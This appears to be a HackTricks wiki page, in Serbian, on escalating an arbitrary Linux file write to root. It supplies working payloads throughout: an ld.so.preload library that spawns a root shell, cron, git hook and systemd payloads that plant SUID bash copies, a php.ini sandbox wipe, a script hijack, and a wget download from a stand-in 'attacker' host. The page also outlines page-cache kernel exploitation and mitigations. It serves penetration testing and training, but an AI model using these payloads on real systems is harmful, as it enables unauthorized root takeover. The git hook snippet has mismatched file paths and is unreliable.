# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ova datoteka se ponaša kao **`LD_PRELOAD`** env promenljiva, ali takođe radi i u **SUID binaries**.\
Ako možeš da je kreiraš ili izmeniš, možeš samo da dodaš **putanju do biblioteke koja će biti učitana** sa svakim izvršenim binary.

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) su **skripte** koje se **pokreću** na različitim **događajima** u git repozitorijumu, kao što su kada se kreira commit, merge... Dakle, ako **privilegovani skript ili korisnik** često izvršava ove radnje i moguće je **pisati u `.git` folder**, ovo se može iskoristiti za **privesc**.

Na primer, moguće je **generisati skript** u git repo-u u **`.git/hooks`** tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

Ako možeš da **pišeš cron-related fajlove koje root izvršava**, obično možeš da dobiješ code execution sledeći put kada se job pokrene. Zanimljive mete uključuju:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root-ov sopstveni crontab u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` timers and the services they trigger

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipični putevi zloupotrebe:

- **Dodati novi root cron posao** u `/etc/crontab` ili u fajl u `/etc/cron.d/`
- **Zameniti skriptu** koju već izvršava `run-parts`
- **Ubaciti backdoor u postojeći timer target** izmenom skripte ili binarnog fajla koji pokreće

Minimalni primer cron payload-a:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ako možete da pišete samo unutar cron direktorijuma koji koristi `run-parts`, umesto toga ubacite tamo izvršni fajl:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Napomene:

- `run-parts` obično ignoriše nazive fajlova koji sadrže tačke, pa preferiraj nazive kao što je `backup` umesto `backup.sh`.
- Neke distro distribucije koriste `anacron` ili `systemd` tajmere umesto klasičnog cron-a, ali ideja zloupotrebe je ista: **izmeni ono što će root kasnije izvršiti**.

### Service & Socket files

Ako možeš da upisuješ u **`systemd` unit fajlove** ili fajlove na koje oni upućuju, možda ćeš moći da dobiješ code execution kao root tako što ćeš ponovo učitati i restartovati unit, ili čekanjem da se aktivira service/socket putanja.

Zanimljive mete uključuju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides u `/etc/systemd/system/<unit>.d/*.conf`
- Service skripte/binarni fajlovi na koje ukazuju `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` putanje koje učitava root servis

Brze provere:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Uobičajene abuse putanje:

- **Overwrite `ExecStart=`** u root-owned service unit-u koji možeš da menjaš
- **Dodaj drop-in override** sa malicioznim `ExecStart=` i prvo obriši stari
- **Backdoor-uj script/binary** koji je već referenciran od strane unit-a
- **Hijack-uj socket-activated service** tako što ćeš izmeniti odgovarajući `.service` fajl koji se pokreće kada socket primi konekciju

Primer malicioznog override-a:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipičan tok aktivacije:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ako ne možete sami da restartujete servise, ali možete da menjate socket-activated unit, možda će vam biti dovoljno samo da **sačekate konekciju klijenta** da bi se pokrenuo backdoored service kao root.

### Overwrite restriktivan `php.ini` koji koristi privilegovani PHP sandbox

Neki custom daemons validiraju korisnički PHP tako što pokreću `php` sa **restriktivnim `php.ini`** (na primer, `disable_functions=exec,system,...`). Ako sandboxed code i dalje ima bilo kakav **write primitive** (kao `file_put_contents`) i možete da dođete do **tačne `php.ini` putanje** koju koristi daemon, možete da **overwrite-ujete taj config** da uklonite restrikcije, a zatim pošaljete drugi payload koji se izvršava sa elevated privileges.

Tipičan tok:

1. Prvi payload overwrite-uje sandbox config.
2. Drugi payload izvršava code sada kada su dangerous functions ponovo omogućene.

Minimalni primer (zamenite putanju koju koristi daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ako daemon radi kao root (ili validira pomoću putanja u vlasništvu root-a), drugo izvršavanje daje root kontekst. Ovo je suštinski **privilege escalation via config overwrite** kada sandboxed runtime i dalje može da upisuje fajlove.

### binfmt_misc

Fajl koji se nalazi u `/proc/sys/fs/binfmt_misc` označava koji binary treba da izvrši koji tip fajlova. TODO: proveriti uslove da bi se ovo zloupotrebilo za izvršavanje rev shell kada je otvoren uobičajen tip fajla.

### Overwrite schema handlers (like http: or https:)

Napadač sa write dozvolama u konfiguracionim direktorijumima žrtve može lako da zameni ili kreira fajlove koji menjaju ponašanje sistema, što rezultira nenamernim code execution. Izmenom fajla `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS URL handlers pokazuju na malicious fajl (npr. postavljanjem `x-scheme-handler/http=evil.desktop`), napadač obezbeđuje da **klik na bilo koji http ili https link pokreće code naveden u tom `evil.desktop` fajlu**. Na primer, nakon što se sledeći malicious code postavi u `evil.desktop` u `$HOME/.local/share/applications`, svaki eksterni klik na URL pokreće ugrađenu komandu:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Za više informacija proverite [**ovaj post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) gde je korišćen za iskorišćavanje stvarne ranjivosti.

### Root izvršava user-writable skripte/binarnе fajlove

Ako privilegovani workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binary unutar direktorijuma u vlasništvu neprivilegovanog korisnika), možete ga hijackovati:

- **Detect the execution:** nadgledajte procese pomoću [pspy](https://github.com/DominicBreuker/pspy) da biste uhvatili root kako poziva user-controlled putanje:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** osiguraj da su i ciljna datoteka i njen direktorijum u tvom vlasništvu i da su writable.
- **Hijack the target:** napravi backup originalnog binary/script-a i ubaci payload koji pravi SUID shell (ili neku drugu root akciju), zatim vrati permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokreni privilegovanu akciju** (npr. pritiskom na UI dugme koje pokreće helper). Kada root ponovo izvrši hijacked path, uhvati escalated shell sa `./rootshell -p`.

### Page-cache-only izmena fajla privilegovanih binarija

Neki kernel bugovi ne menjaju fajl **na disku**. Umesto toga, omogućavaju ti da menjaš samo **page cache copy** čitljivog fajla. Ako možeš da ciljaš **setuid** ili inače **root-executed** binarni fajl, sledeće izvršavanje može da pokrene attacker-controlled bajtove iz memorije i eskalira privilegije iako je hash fajla na disku nepromenjen.

Ovo je korisno posmatrati kao **runtime-only file write primitive**:

- **Disk ostaje čist**: inode i bajtovi na disku se ne menjaju
- **Memorija je prljava**: procesi koji čitaju/izvršavaju keširanu stranicu dobijaju attacker-modified sadržaj
- **Efekat je privremen**: promena nestaje posle reboot-a ili eviction-a iz cache-a

Ova primitiva se nalazi između klasičnog **arbitrary file write** i starijih **page-cache abuse** bugova kao što su Dirty COW / Dirty Pipe:

- Dirty COW se oslanjao na race
- Dirty Pipe je imao ograničenja u poziciji pisanja
- Page-cache-only primitiva može biti pouzdanija ako vulnerable path daje direktne upise u cached file-backed pages

#### Generic privesc flow

1. Dobij kernel primitivu koja može da upisuje u **file-backed page cache pages**
2. Iskoristi je protiv **readable privileged binary** ili drugog root-executed fajla
3. Pokreni izvršavanje **pre nego što** se stranica izbaci iz cache-a
4. Dobij code execution kao root dok on-disk fajl i dalje izgleda neizmenjeno

Tipične high-value mete:

- **setuid-root** binarni fajlovi
- Helperi koje pokreću **root services**
- Binarni fajlovi koji se često izvršavaju iz **containers deljenih sa host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Vulnerable path je bio u Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` može da pomeri reference na page-cache pages iz čitljivog fajla u crypto TX scatterlist
- in-place `algif_aead` decrypt path je ponovo koristio source i destination buffere
- `authencesn` je zatim pisao u destination tag region
- kada je taj region i dalje referencirao spliced file-backed pages, upis je završio u **page cache-u target fajla**

Dakle, zanimljiva tehnika nije sam CVE, već obrazac:

- **ubaci file-backed cache pages u kernel subsystem**
- nateraj subsystem da ih **tretira kao writable output**
- pokreni mali kontrolisani overwrite u memoriji

Javni PoC je koristio ponovljene **4-byte writes** da zakrpi `/usr/bin/su` u memoriji, a zatim ga je izvršio.

#### Exposure and hunting

Ako sumnjaš na ovu klasu bugova, nemoj se oslanjati samo na provere integriteta diska. Takođe proveri:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` može biti učitljiv/odučitljiv kao modul
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binaries su dobri ciljevi jer patch samo za page-cache može biti dovoljan da pretvori lokalni foothold u root

#### Attack-surface reduction for the `algif_aead` path

If the vulnerable interface is provided by a loadable module:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ako je kompajlirano u kernel, neki disclosures su prijavili blokiranje init path sa:
```bash
initcall_blacklist=algif_aead_init
```
Ova vrsta mitigacije vredi zapamtiti i za druge kernel LPEs: ako eksploatacija zavisi od određenog opcionog interfejsa, onemogućavanje ili blacklisting tog interfejsa može prekinuti put eksploatacije čak i pre nego što je dostupna potpuna kernel nadogradnja.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Openwall oss-security disclosure for CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)

{{#include ../../banners/hacktricks-training.md}}
